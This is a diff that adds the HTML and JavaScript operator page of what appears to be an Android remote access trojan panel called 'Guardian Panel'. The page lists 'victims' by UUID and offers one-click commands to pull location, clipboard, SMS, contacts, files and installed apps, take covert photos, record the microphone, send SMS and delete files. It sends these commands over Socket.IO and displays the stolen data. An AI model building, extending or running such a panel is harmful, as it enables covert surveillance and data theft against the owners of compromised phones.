@@ -1,0 +1,748 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Guardian Panel - Device Control</title>
+    <script src="https://cdn.tailwindcss.com"></script>
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0-beta3/css/all.min.css">
+    <style>
+        /* Custom styles (similar to dashboard) */
+        body {
+            background-color: #111827; /* bg-gray-900 */
+            color: #d1d5db; /* text-gray-300 */
+        }
+        .sidebar {
+            transition: transform 0.3s ease-in-out;
+        }
+        @media (max-width: 768px) {
+            .sidebar {
+                transform: translateX(-100%);
+            }
+            .sidebar.active {
+                transform: translateX(0);
+            }
+        }
+        .toast-container { /* ... Toast styles ... */ }
+        .toast { /* ... Toast styles ... */ }
+        .toast.success { /* ... */ }
+        .toast.error { /* ... */ }
+        .toast.warning { /* ... */ }
+        .toast.info { /* ... */ }
+        .toast-icon { /* ... */ }
+        .toast-content { /* ... */ }
+        .toast-title { /* ... */ }
+        .loading-overlay { /* ... Loading styles ... */ }
+        .spinner { /* ... Loading styles ... */ }
+        @keyframes spin { /* ... Loading styles ... */ }
+
+        /* Modal styles */
+        .modal-overlay {
+            position: fixed;
+            inset: 0;
+            background-color: rgba(0, 0, 0, 0.7);
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            z-index: 100;
+            opacity: 0;
+            visibility: hidden;
+            transition: opacity 0.3s ease, visibility 0.3s ease;
+        }
+        .modal-overlay.active {
+            opacity: 1;
+            visibility: visible;
+        }
+        .modal-content {
+            background-color: #1f2937; /* bg-gray-800 */
+            padding: 1.5rem;
+            border-radius: 0.5rem; /* rounded-lg */
+            box-shadow: 0 10px 15px -3px rgba(0, 0, 0, 0.1), 0 4px 6px -2px rgba(0, 0, 0, 0.05); /* shadow-lg */
+            width: 90%;
+            max-width: 500px;
+            position: relative;
+        }
+        .modal-close {
+            position: absolute;
+            top: 0.5rem;
+            right: 0.5rem;
+            background: none;
+            border: none;
+            color: #9ca3af; /* text-gray-400 */
+            font-size: 1.5rem;
+            cursor: pointer;
+        }
+        .modal-close:hover {
+            color: #e5e7eb; /* text-gray-200 */
+        }
+
+        /* Action grid */
+        .action-grid {
+            display: grid;
+            grid-template-columns: repeat(auto-fit, minmax(150px, 1fr));
+            gap: 1rem;
+        }
+        .action-item {
+            background-color: #374151; /* bg-gray-700 */
+            border-radius: 0.375rem; /* rounded-md */
+            padding: 1rem;
+            text-align: center;
+            cursor: pointer;
+            transition: background-color 0.2s ease;
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            justify-content: center;
+            min-height: 100px;
+        }
+        .action-item:hover {
+            background-color: #4b5563; /* bg-gray-600 */
+        }
+        .action-item i {
+            font-size: 1.5rem; /* text-2xl */
+            margin-bottom: 0.5rem;
+        }
+        .action-item span {
+            font-size: 0.875rem; /* text-sm */
+        }
+
+        /* Result areas */
+        .result-area {
+            background-color: #1f2937; /* bg-gray-800 */
+            border: 1px solid #374151; /* border-gray-700 */
+            border-radius: 0.375rem; /* rounded-md */
+            padding: 1rem;
+            margin-top: 1rem;
+            max-height: 300px;
+            overflow-y: auto;
+            font-family: monospace;
+            font-size: 0.875rem;
+        }
+    </style>
+</head>
+<body class="flex h-screen overflow-hidden">
+
+    <!-- Sidebar -->
+    <aside class="sidebar fixed inset-y-0 left-0 z-30 w-64 bg-gray-800 text-gray-300 p-4 space-y-6 md:relative md:translate-x-0 flex flex-col">
+         <div>
+            <div class="flex items-center justify-between">
+                <h2 class="text-2xl font-semibold text-white">Guardian Panel</h2>
+                <button class="md:hidden menu-toggle text-gray-400 hover:text-white">
+                    <i class="fas fa-times"></i>
+                </button>
+            </div>
+            <nav class="space-y-2 mt-6">
+                <a href="/dashboard.html" class="flex items-center px-3 py-2 hover:bg-gray-700 rounded-md">
+                    <i class="fas fa-tachometer-alt w-5 mr-3"></i> Dashboard
+                </a>
+                <a href="/settings.html" class="flex items-center px-3 py-2 hover:bg-gray-700 rounded-md">
+                    <i class="fas fa-cog w-5 mr-3"></i> Settings
+                </a>
+                <a href="/dashboard.html#notifications" id="notificationHistoryLinkSidebar" class="flex items-center px-3 py-2 hover:bg-gray-700 rounded-md">
+                    <i class="fas fa-bell w-5 mr-3"></i> Notifications
+                </a>
+            </nav>
+        </div>
+        <div class="mt-auto">
+             <button id="logoutButton" class="w-full flex items-center px-3 py-2 text-red-400 hover:bg-red-700 hover:text-white rounded-md">
+                 <i class="fas fa-sign-out-alt w-5 mr-3"></i> Logout
+             </button>
+            <div class="text-xs text-center text-gray-500 mt-4">
+                Dev by @SisuryaOfficial - Modern UI
+            </div>
+        </div>
+    </aside>
+
+    <!-- Main Content -->
+    <div class="flex-1 flex flex-col overflow-hidden">
+        <!-- Header -->
+        <header class="bg-gray-800 shadow-md p-4 flex items-center justify-between">
+             <button class="menu-toggle text-gray-400 hover:text-white md:hidden">
+                 <i class="fas fa-bars"></i>
+             </button>
+            <h1 id="victimModelHeader" class="text-xl font-semibold text-white">Device Control</h1>
+            <a href="/dashboard.html" class="text-gray-400 hover:text-white">
+                <i class="fas fa-arrow-left mr-2"></i> Back to Dashboard
+            </a>
+        </header>
+
+        <!-- Content Area -->
+        <main class="flex-1 overflow-x-hidden overflow-y-auto bg-gray-900 p-6">
+            <div id="deviceInfo" class="mb-6 p-4 bg-gray-800 rounded-lg shadow">
+                <h2 class="text-lg font-semibold text-white mb-2">Device Information</h2>
+                <p><strong>Model:</strong> <span id="victimModel">Loading...</span></p>
+                <p><strong>Battery:</strong> <span id="victimBattery">N/A</span>%</p>
+                <p><strong>Version:</strong> <span id="victimVersion">N/A</span></p>
+                <p><strong>Provider:</strong> <span id="victimProvider">N/A</span></p>
+                <p><strong>UUID:</strong> <span id="victimUUID">N/A</span></p>
+            </div>
+
+            <h2 class="text-xl font-semibold text-white mb-4">Available Actions</h2>
+            <div class="action-grid">
+                <!-- Info Gathering -->
+                <div class="action-item" data-command="get_location">
+                    <i class="fas fa-map-marker-alt text-red-400"></i>
+                    <span>Get Location</span>
+                </div>
+                <div class="action-item" data-command="get_clipboard">
+                    <i class="fas fa-clipboard text-yellow-400"></i>
+                    <span>Get Clipboard</span>
+                </div>
+                <div class="action-item" data-command="get_device_info">
+                    <i class="fas fa-info-circle text-blue-400"></i>
+                    <span>Device Info</span>
+                </div>
+
+                <!-- Data Extraction -->
+                <div class="action-item" data-command="get_sms">
+                    <i class="fas fa-comments text-green-400"></i>
+                    <span>Get SMS</span>
+                </div>
+                <div class="action-item" data-command="get_contacts">
+                    <i class="fas fa-address-book text-purple-400"></i>
+                    <span>Get Contacts</span>
+                </div>
+                <div class="action-item" data-command="get_apps">
+                    <i class="fas fa-th-large text-indigo-400"></i>
+                    <span>Get Apps</span>
+                </div>
+                <div class="action-item" data-command="get_files" data-modal="fileModal">
+                    <i class="fas fa-folder-open text-orange-400"></i>
+                    <span>Get Files</span>
+                </div>
+
+                <!-- Camera & Mic -->
+                <div class="action-item" data-command="take_photo_main">
+                    <i class="fas fa-camera text-cyan-400"></i>
+                    <span>Take Photo (Main)</span>
+                </div>
+                <div class="action-item" data-command="take_photo_selfie">
+                    <i class="fas fa-camera-retro text-teal-400"></i>
+                    <span>Take Photo (Selfie)</span>
+                </div>
+                <div class="action-item" data-command="record_mic" data-modal="recordMicModal">
+                    <i class="fas fa-microphone text-pink-400"></i>
+                    <span>Record Mic</span>
+                </div>
+                 <div class="action-item" data-command="stop_audio">
+                    <i class="fas fa-volume-mute text-gray-400"></i>
+                    <span>Stop Audio</span>
+                </div>
+                <!-- Add Record Camera buttons if needed -->
+
+                <!-- Interaction -->
+                <div class="action-item" data-command="send_sms" data-modal="smsModal">
+                    <i class="fas fa-paper-plane text-lime-400"></i>
+                    <span>Send SMS</span>
+                </div>
+                <div class="action-item" data-command="show_toast" data-modal="toastModal">
+                    <i class="fas fa-comment-alt text-rose-400"></i>
+                    <span>Show Toast</span>
+                </div>
+                <div class="action-item" data-command="show_notification" data-modal="notificationModal">
+                    <i class="fas fa-bell text-amber-400"></i>
+                    <span>Show Notification</span>
+                </div>
+                <div class="action-item" data-command="set_clipboard" data-modal="clipboardModal">
+                    <i class="fas fa-paste text-fuchsia-400"></i>
+                    <span>Set Clipboard</span>
+                </div>
+
+                <!-- Control -->
+                <div class="action-item" data-command="vibrate">
+                    <i class="fas fa-vibrator text-violet-400"></i>
+                    <span>Vibrate</span>
+                </div>
+                <div class="action-item" data-command="open_url" data-modal="urlModal">
+                    <i class="fas fa-external-link-alt text-sky-400"></i>
+                    <span>Open URL</span>
+                </div>
+                <div class="action-item" data-command="start_app" data-modal="appModal">
+                    <i class="fas fa-rocket text-emerald-400"></i>
+                    <span>Start App</span>
+                </div>
+                <div class="action-item" data-command="delete_file" data-modal="deleteFileModal">
+                    <i class="fas fa-trash-alt text-red-500"></i>
+                    <span>Delete File</span>
+                </div>
+            </div>
+
+            <!-- Result Display Areas -->
+            <div id="resultDisplay" class="mt-8 space-y-4">
+                <!-- Location Result -->
+                <div id="locationResult" class="hidden">
+                    <h3 class="text-lg font-semibold text-white mb-2">Location Result</h3>
+                    <div class="result-area">
+                        <p id="locationCoordinates"></p>
+                        <!-- Placeholder for map -->
+                        <div id="locationMapPlaceholder" class="mt-2 h-48 bg-gray-700 rounded flex items-center justify-center text-gray-500">Map Placeholder</div>
+                    </div>
+                </div>
+                <!-- Clipboard Result -->
+                <div id="clipboardResult" class="hidden">
+                    <h3 class="text-lg font-semibold text-white mb-2">Clipboard Content</h3>
+                    <div class="result-area">
+                        <pre id="clipboardContent"></pre>
+                    </div>
+                </div>
+                <!-- SMS Result -->
+                <div id="smsResult" class="hidden">
+                    <h3 class="text-lg font-semibold text-white mb-2">SMS Messages</h3>
+                    <div id="smsContainer" class="result-area space-y-2"></div>
+                </div>
+                <!-- Contacts Result -->
+                <div id="contactsResult" class="hidden">
+                    <h3 class="text-lg font-semibold text-white mb-2">Contacts</h3>
+                    <div id="contactsContainer" class="result-area space-y-1"></div>
+                </div>
+                <!-- Apps Result -->
+                <div id="appsResult" class="hidden">
+                    <h3 class="text-lg font-semibold text-white mb-2">Installed Apps</h3>
+                    <div id="appsContainer" class="result-area grid grid-cols-1 sm:grid-cols-2 md:grid-cols-3 gap-2"></div>
+                </div>
+                 <!-- Device Info Result -->
+                <div id="deviceInfoResult" class="hidden">
+                    <h3 class="text-lg font-semibold text-white mb-2">Device Info Details</h3>
+                    <div id="deviceInfoContainer" class="result-area grid grid-cols-1 sm:grid-cols-2 gap-x-4 gap-y-1"></div>
+                </div>
+                <!-- Camera Result -->
+                <div id="cameraResult" class="hidden">
+                    <h3 class="text-lg font-semibold text-white mb-2">Camera Photo</h3>
+                    <div class="result-area flex justify-center">
+                        <img id="cameraPhoto" src="" alt="Camera Photo" class="max-w-full max-h-64 rounded">
+                    </div>
+                </div>
+                 <!-- Generic Result -->
+                <div id="genericResult" class="hidden">
+                    <h3 class="text-lg font-semibold text-white mb-2">Command Result</h3>
+                    <div class="result-area">
+                        <pre id="genericContent"></pre>
+                    </div>
+                </div>
+            </div>
+
+        </main>
+    </div>
+
+    <!-- Modals -->
+    <!-- SMS Modal -->
+    <div id="smsModal" class="modal-overlay">
+        <div class="modal-content">
+            <button class="modal-close">&times;</button>
+            <h3 class="text-lg font-semibold text-white mb-4">Send SMS</h3>
+            <form id="smsForm" class="space-y-4">
+                <div>
+                    <label for="smsNumber" class="block text-sm font-medium text-gray-400">Phone Number</label>
+                    <input type="tel" id="smsNumber" required class="w-full px-3 py-2 mt-1 text-gray-200 bg-gray-700 border border-gray-600 rounded-md focus:outline-none focus:ring-2 focus:ring-blue-500">
+                </div>
+                <div>
+                    <label for="smsMessage" class="block text-sm font-medium text-gray-400">Message</label>
+                    <textarea id="smsMessage" rows="3" required class="w-full px-3 py-2 mt-1 text-gray-200 bg-gray-700 border border-gray-600 rounded-md focus:outline-none focus:ring-2 focus:ring-blue-500"></textarea>
+                </div>
+                <button type="submit" class="w-full px-4 py-2 font-semibold text-white bg-blue-600 rounded-md hover:bg-blue-700">Send</button>
+            </form>
+        </div>
+    </div>
+
+    <!-- File Modal -->
+    <div id="fileModal" class="modal-overlay">
+        <div class="modal-content">
+            <button class="modal-close">&times;</button>
+            <h3 class="text-lg font-semibold text-white mb-4">Get Files from Path</h3>
+            <form id="fileForm" class="space-y-4">
+                <div>
+                    <label for="filePath" class="block text-sm font-medium text-gray-400">Folder Path (e.g., /sdcard/Download)</label>
+                    <input type="text" id="filePath" required class="w-full px-3 py-2 mt-1 text-gray-200 bg-gray-700 border border-gray-600 rounded-md focus:outline-none focus:ring-2 focus:ring-blue-500">
+                </div>
+                <button type="submit" class="w-full px-4 py-2 font-semibold text-white bg-blue-600 rounded-md hover:bg-blue-700">Get Files</button>
+            </form>
+        </div>
+    </div>
+
+     <!-- Delete File Modal -->
+    <div id="deleteFileModal" class="modal-overlay">
+        <div class="modal-content">
+            <button class="modal-close">&times;</button>
+            <h3 class="text-lg font-semibold text-white mb-4">Delete File</h3>
+            <form id="deleteFileForm" class="space-y-4">
+                <div>
+                    <label for="deleteFilePath" class="block text-sm font-medium text-gray-400">File Path (e.g., /sdcard/Download/file.txt)</label>
+                    <input type="text" id="deleteFilePath" required class="w-full px-3 py-2 mt-1 text-gray-200 bg-gray-700 border border-gray-600 rounded-md focus:outline-none focus:ring-2 focus:ring-blue-500">
+                </div>
+                <button type="submit" class="w-full px-4 py-2 font-semibold text-white bg-red-600 rounded-md hover:bg-red-700">Delete File</button>
+            </form>
+        </div>
+    </div>
+
+    <!-- Record Mic Modal -->
+    <div id="recordMicModal" class="modal-overlay">
+        <div class="modal-content">
+            <button class="modal-close">&times;</button>
+            <h3 class="text-lg font-semibold text-white mb-4">Record Microphone</h3>
+            <form id="recordMicForm" class="space-y-4">
+                <div>
+                    <label for="recordDuration" class="block text-sm font-medium text-gray-400">Duration (seconds)</label>
+                    <input type="number" id="recordDuration" min="1" value="10" required class="w-full px-3 py-2 mt-1 text-gray-200 bg-gray-700 border border-gray-600 rounded-md focus:outline-none focus:ring-2 focus:ring-blue-500">
+                </div>
+                <button type="submit" class="w-full px-4 py-2 font-semibold text-white bg-blue-600 rounded-md hover:bg-blue-700">Start Recording</button>
+            </form>
+        </div>
+    </div>
+
+    <!-- Toast Modal -->
+    <div id="toastModal" class="modal-overlay">
+        <div class="modal-content">
+            <button class="modal-close">&times;</button>
+            <h3 class="text-lg font-semibold text-white mb-4">Show Toast Message</h3>
+            <form id="toastForm" class="space-y-4">
+                <div>
+                    <label for="toastMessage" class="block text-sm font-medium text-gray-400">Message</label>
+                    <input type="text" id="toastMessage" required class="w-full px-3 py-2 mt-1 text-gray-200 bg-gray-700 border border-gray-600 rounded-md focus:outline-none focus:ring-2 focus:ring-blue-500">
+                </div>
+                <button type="submit" class="w-full px-4 py-2 font-semibold text-white bg-blue-600 rounded-md hover:bg-blue-700">Show Toast</button>
+            </form>
+        </div>
+    </div>
+
+    <!-- Notification Modal -->
+    <div id="notificationModal" class="modal-overlay">
+        <div class="modal-content">
+            <button class="modal-close">&times;</button>
+            <h3 class="text-lg font-semibold text-white mb-4">Show Notification</h3>
+            <form id="notificationForm" class="space-y-4">
+                <div>
+                    <label for="notificationTitle" class="block text-sm font-medium text-gray-400">Title</label>
+                    <input type="text" id="notificationTitle" required class="w-full px-3 py-2 mt-1 text-gray-200 bg-gray-700 border border-gray-600 rounded-md focus:outline-none focus:ring-2 focus:ring-blue-500">
+                </div>
+                <div>
+                    <label for="notificationText" class="block text-sm font-medium text-gray-400">Text (Optional: Can be a URL)</label>
+                    <input type="text" id="notificationText" class="w-full px-3 py-2 mt-1 text-gray-200 bg-gray-700 border border-gray-600 rounded-md focus:outline-none focus:ring-2 focus:ring-blue-500">
+                </div>
+                <button type="submit" class="w-full px-4 py-2 font-semibold text-white bg-blue-600 rounded-md hover:bg-blue-700">Show Notification</button>
+            </form>
+        </div>
+    </div>
+
+    <!-- Clipboard Modal -->
+    <div id="clipboardModal" class="modal-overlay">
+        <div class="modal-content">
+            <button class="modal-close">&times;</button>
+            <h3 class="text-lg font-semibold text-white mb-4">Set Clipboard Text</h3>
+            <form id="clipboardForm" class="space-y-4">
+                <div>
+                    <label for="clipboardText" class="block text-sm font-medium text-gray-400">Text</label>
+                    <textarea id="clipboardText" rows="3" required class="w-full px-3 py-2 mt-1 text-gray-200 bg-gray-700 border border-gray-600 rounded-md focus:outline-none focus:ring-2 focus:ring-blue-500"></textarea>
+                </div>
+                <button type="submit" class="w-full px-4 py-2 font-semibold text-white bg-blue-600 rounded-md hover:bg-blue-700">Set Clipboard</button>
+            </form>
+        </div>
+    </div>
+
+    <!-- URL Modal -->
+    <div id="urlModal" class="modal-overlay">
+        <div class="modal-content">
+            <button class="modal-close">&times;</button>
+            <h3 class="text-lg font-semibold text-white mb-4">Open URL</h3>
+            <form id="urlForm" class="space-y-4">
+                <div>
+                    <label for="openUrl" class="block text-sm font-medium text-gray-400">URL (e.g., https://example.com)</label>
+                    <input type="url" id="openUrl" required class="w-full px-3 py-2 mt-1 text-gray-200 bg-gray-700 border border-gray-600 rounded-md focus:outline-none focus:ring-2 focus:ring-blue-500">
+                </div>
+                <button type="submit" class="w-full px-4 py-2 font-semibold text-white bg-blue-600 rounded-md hover:bg-blue-700">Open URL</button>
+            </form>
+        </div>
+    </div>
+
+    <!-- App Modal -->
+    <div id="appModal" class="modal-overlay">
+        <div class="modal-content">
+            <button class="modal-close">&times;</button>
+            <h3 class="text-lg font-semibold text-white mb-4">Start Application</h3>
+            <form id="appForm" class="space-y-4">
+                <div>
+                    <label for="appPackage" class="block text-sm font-medium text-gray-400">Package Name (e.g., com.whatsapp)</label>
+                    <input type="text" id="appPackage" required class="w-full px-3 py-2 mt-1 text-gray-200 bg-gray-700 border border-gray-600 rounded-md focus:outline-none focus:ring-2 focus:ring-blue-500">
+                </div>
+                <button type="submit" class="w-full px-4 py-2 font-semibold text-white bg-blue-600 rounded-md hover:bg-blue-700">Start App</button>
+            </form>
+        </div>
+    </div>
+
+    <!-- Toast Container -->
+    <div class="toast-container">
+        <!-- Toasts will be added here -->
+    </div>
+
+    <script src="/socket.io/socket.io.js"></script>
+    <script src="/js/main.js"></script>
+    <script>
+        let currentVictimUuid = "."; // Placeholder, will be set dynamically
+
+        // --- Utility Functions (Should be in main.js but included here for context) ---
+        function showToast(type, title, message) { /* ... implementation ... */ }
+        function showLoading() { /* ... implementation ... */ }
+        function hideLoading() { /* ... implementation ... */ }
+        function openModal(modal) { modal.classList.add("active"); }
+        function closeModal(modal) { modal.classList.remove("active"); }
+
+        // --- Victim Page Specific Logic ---
+        document.addEventListener("DOMContentLoaded", () => {
+            const urlParams = new URLSearchParams(window.location.search);
+            currentVictimUuid = urlParams.get("uuid"); // Get UUID from URL query parameter
+
+            if (!currentVictimUuid) {
+                showToast("error", "Error", "No victim UUID specified.");
+                // Optionally redirect back to dashboard
+                // window.location.href = "/dashboard.html";
+                return;
+            }
+
+            // Fetch victim details
+            fetch(`/api/victim/${currentVictimUuid}`)
+                .then(res => res.ok ? res.json() : Promise.reject(res))
+                .then(data => {
+                    if (data.success && data.victim) {
+                        document.getElementById("victimModelHeader").textContent = `Control: ${data.victim.model}`;
+                        document.getElementById("victimModel").textContent = data.victim.model;
+                        document.getElementById("victimBattery").textContent = data.victim.battery;
+                        document.getElementById("victimVersion").textContent = data.victim.version;
+                        document.getElementById("victimProvider").textContent = data.victim.provider;
+                        document.getElementById("victimUUID").textContent = data.victim.uuid;
+                    } else {
+                        showToast("error", "Error", data.message || "Failed to load victim details.");
+                    }
+                })
+                .catch(err => {
+                    console.error("Error fetching victim details:", err);
+                    showToast("error", "Error", "Could not fetch victim details.");
+                });
+
+            // --- Command Execution Logic ---
+            const actionItems = document.querySelectorAll(".action-item");
+            actionItems.forEach(item => {
+                item.addEventListener("click", () => {
+                    const command = item.getAttribute("data-command");
+                    const modalId = item.getAttribute("data-modal");
+
+                    if (modalId) {
+                        const modal = document.getElementById(modalId);
+                        if (modal) openModal(modal);
+                    } else {
+                        // Execute command directly if no modal
+                        executeCommand(command, currentVictimUuid);
+                    }
+                });
+            });
+
+            // --- Modal Form Submissions ---
+            function handleFormSubmit(formId, command, paramBuilder) {
+                const form = document.getElementById(formId);
+                if (form) {
+                    form.addEventListener("submit", (e) => {
+                        e.preventDefault();
+                        const params = paramBuilder(form);
+                        if (params) {
+                            executeCommand(command, currentVictimUuid, params);
+                            const modal = form.closest(".modal-overlay");
+                            if (modal) closeModal(modal);
+                            form.reset();
+                        }
+                    });
+                }
+            }
+
+            handleFormSubmit("smsForm", "send_sms", form => ({
+                number: form.querySelector("#smsNumber").value,
+                message: form.querySelector("#smsMessage").value
+            }));
+            handleFormSubmit("fileForm", "get_files", form => ({ path: form.querySelector("#filePath").value }));
+            handleFormSubmit("deleteFileForm", "delete_file", form => ({ path: form.querySelector("#deleteFilePath").value }));
+            handleFormSubmit("recordMicForm", "record_mic", form => ({ duration: form.querySelector("#recordDuration").value }));
+            handleFormSubmit("toastForm", "show_toast", form => ({ message: form.querySelector("#toastMessage").value }));
+            handleFormSubmit("notificationForm", "show_notification", form => ({
+                title: form.querySelector("#notificationTitle").value,
+                text: form.querySelector("#notificationText").value
+            }));
+            handleFormSubmit("clipboardForm", "set_clipboard", form => ({ text: form.querySelector("#clipboardText").value }));
+            handleFormSubmit("urlForm", "open_url", form => ({ url: form.querySelector("#openUrl").value }));
+            handleFormSubmit("appForm", "start_app", form => ({ package_name: form.querySelector("#appPackage").value }));
+
+            // Close modal buttons
+            document.querySelectorAll(".modal-close").forEach(btn => {
+                btn.addEventListener("click", () => {
+                    const modal = btn.closest(".modal-overlay");
+                    if (modal) closeModal(modal);
+                });
+            });
+            // Close modal on overlay click
+             document.querySelectorAll(".modal-overlay").forEach(overlay => {
+                overlay.addEventListener("click", (e) => {
+                    if (e.target === overlay) {
+                        closeModal(overlay);
+                    }
+                });
+            });
+
+            // --- Socket.IO Result Handling (Should be in main.js) ---
+            if (typeof socket !== "undefined") {
+                socket.on("command_result", (data) => {
+                    // Only process results for the current victim
+                    if (data.uuid !== currentVictimUuid) return;
+
+                    hideLoading();
+                    console.log("Command Result Received:", data);
+
+                    // Hide all result areas first
+                    document.querySelectorAll("#resultDisplay > div").forEach(el => el.classList.add("hidden"));
+
+                    if (data.success) {
+                        showToast("success", `Result: ${data.command}`, data.message || "Command executed successfully.");
+
+                        // Display specific results
+                        if (data.command === "get_location" && data.result) {
+                            document.getElementById("locationResult").classList.remove("hidden");
+                            document.getElementById("locationCoordinates").textContent = `Lat: ${data.result.lat}, Lon: ${data.result.lon}`;
+                            // Update map placeholder or actual map if implemented
+                        } else if (data.command === "get_clipboard" && data.result) {
+                            document.getElementById("clipboardResult").classList.remove("hidden");
+                            document.getElementById("clipboardContent").textContent = data.result.text;
+                        } else if (data.command === "get_sms" && data.result) {
+                            document.getElementById("smsResult").classList.remove("hidden");
+                            updateMessagesView(data.result.messages); // Assumes result format { messages: [...] }
+                        } else if (data.command === "get_contacts" && data.result) {
+                            document.getElementById("contactsResult").classList.remove("hidden");
+                            updateContactsView(data.result.contacts); // Assumes result format { contacts: [...] }
+                        } else if (data.command === "get_apps" && data.result) {
+                            document.getElementById("appsResult").classList.remove("hidden");
+                            updateAppsView(data.result.apps); // Assumes result format { apps: [...] }
+                        } else if (data.command === "get_device_info" && data.result) {
+                            document.getElementById("deviceInfoResult").classList.remove("hidden");
+                            updateDeviceInfoView(data.result.info); // Assumes result format { info: {...} }
+                        } else if ((data.command === "take_photo_main" || data.command === "take_photo_selfie") && data.result) {
+                            document.getElementById("cameraResult").classList.remove("hidden");
+                            document.getElementById("cameraPhoto").src = `data:image/jpeg;base64,${data.result.image}`; // Assumes result { image: "base64..." }
+                        } else if (data.result) {
+                             // Display other results generically
+                            document.getElementById("genericResult").classList.remove("hidden");
+                            document.getElementById("genericContent").textContent = JSON.stringify(data.result, null, 2);
+                        }
+
+                    } else {
+                        showToast("error", `Error: ${data.command}`, data.error || "Command failed.");
+                         document.getElementById("genericResult").classList.remove("hidden");
+                         document.getElementById("genericContent").textContent = `Error: ${data.error || "Command failed."}`;
+                    }
+                });
+            }
+
+            // --- Helper functions for displaying results (Should be in main.js) ---
+            function updateMessagesView(messages) {
+                const container = document.getElementById("smsContainer");
+                container.innerHTML = "";
+                if (!messages || messages.length === 0) {
+                    container.innerHTML = "<p class=\"text-gray-500\">No messages found.</p>"; return;
+                }
+                messages.forEach(msg => {
+                    const div = document.createElement("div");
+                    div.className = `p-2 rounded ${msg.type === "received" ? "bg-gray-600" : "bg-blue-900 text-right"}`;
+                    div.innerHTML = `<p class="text-xs text-gray-400">${msg.address} (${msg.date})</p><p>${msg.body}</p>`;
+                    container.appendChild(div);
+                });
+            }
+            function updateContactsView(contacts) {
+                 const container = document.getElementById("contactsContainer");
+                 container.innerHTML = "";
+                 if (!contacts || contacts.length === 0) {
+                    container.innerHTML = "<p class=\"text-gray-500\">No contacts found.</p>"; return;
+                 }
+                 contacts.forEach(c => {
+                    const div = document.createElement("div");
+                    div.innerHTML = `<p><strong>${c.name}:</strong> ${c.number}</p>`;
+                    container.appendChild(div);
+                 });
+            }
+            function updateAppsView(apps) {
+                const container = document.getElementById("appsContainer");
+                container.innerHTML = "";
+                 if (!apps || apps.length === 0) {
+                    container.innerHTML = "<p class=\"text-gray-500\">No apps found.</p>"; return;
+                 }
+                apps.forEach(app => {
+                    const div = document.createElement("div");
+                    div.className = "bg-gray-700 p-2 rounded text-center";
+                    div.innerHTML = `<i class="fas fa-mobile-alt mb-1"></i><p class="text-xs truncate" title="${app.name}">${app.name}</p><p class="text-xxs text-gray-400 truncate" title="${app.package}">${app.package}</p>`;
+                    container.appendChild(div);
+                });
+            }
+             function updateDeviceInfoView(info) {
+                const container = document.getElementById("deviceInfoContainer");
+                container.innerHTML = "";
+                 if (!info) {
+                    container.innerHTML = "<p class=\"text-gray-500\">No device info received.</p>"; return;
+                 }
+                for (const [key, value] of Object.entries(info)) {
+                    const div = document.createElement("div");
+                    div.innerHTML = `<strong class="text-gray-400">${key}:</strong> ${value}`;
+                    container.appendChild(div);
+                }
+            }
+
+            // --- Mobile Menu Toggle (Should be in main.js) ---
+            const menuToggles = document.querySelectorAll(".menu-toggle");
+            const sidebar = document.querySelector(".sidebar");
+            menuToggles.forEach(toggle => {
+                toggle.addEventListener("click", () => {
+                    sidebar.classList.toggle("active");
+                });
+            });
+
+             // --- Logout Button (Should be in main.js) ---
+            const logoutButton = document.getElementById("logoutButton");
+            if(logoutButton) {
+                logoutButton.addEventListener("click", () => {
+                    fetch("/api/auth/logout")
+                        .then(res => res.json())
+                        .then(data => {
+                            if(data.success) window.location.href = "/login.html";
+                            else showToast("error", "Logout Failed", "Could not log out.");
+                        })
+                        .catch(err => showToast("error", "Logout Error", "An error occurred."));
+                });
+            }
+
+            // --- Notification Link (Should be in main.js) ---
+            const notifLink = document.getElementById("notificationHistoryLinkSidebar");
+            if(notifLink) {
+                notifLink.addEventListener('click', (e) => {
+                    e.preventDefault();
+                    // Store flag to open notifications on dashboard
+                    sessionStorage.setItem('showNotificationsOnLoad', 'true');
+                    window.location.href = '/dashboard.html';
+                });
+            }
+        });
+
+        // --- Global executeCommand function (Should be in main.js) ---
+        function executeCommand(command, uuid, params = {}) {
+            if (typeof socket === "undefined" || !isConnected) {
+                showToast("error", "Connection Error", "Not connected to server");
+                return;
+            }
+            if (!uuid) {
+                 showToast("error", "Error", "No victim selected");
+                 return;
+            }
+
+            console.log(`Executing command: ${command} on ${uuid} with params:`, params);
+            showLoading();
+
+            socket.emit("execute_command", {
+                command,
+                uuid,
+                params
+            });
+        }
+
+    </script>
+</body>
+</html>
